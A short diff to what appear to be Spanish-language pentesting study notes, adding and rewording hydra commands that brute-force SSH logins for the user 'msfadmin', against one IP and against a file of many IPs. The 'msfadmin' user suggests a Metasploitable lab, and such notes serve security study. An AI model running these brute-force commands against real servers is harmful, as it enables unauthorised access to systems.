@@ -1,2 +1,4 @@
-++ hydra -l msfadmin -p <diccionario> -t 4 -f -V ssh://<ip> ---> Este comando realiza 
+++ hydra -l msfadmin -p <diccionario.txt> -t 4 -f -V ssh://<ip> ---> Permite realizar
 intentos de fuerza bruta a un servidor ssh
+
+++ hydra -l msfadmin -P <diccionario.txt> -t 4 -f -V -M <ips.txt> ssh ---> Permite realizar intentos de fuerza bruta a mútiples ips
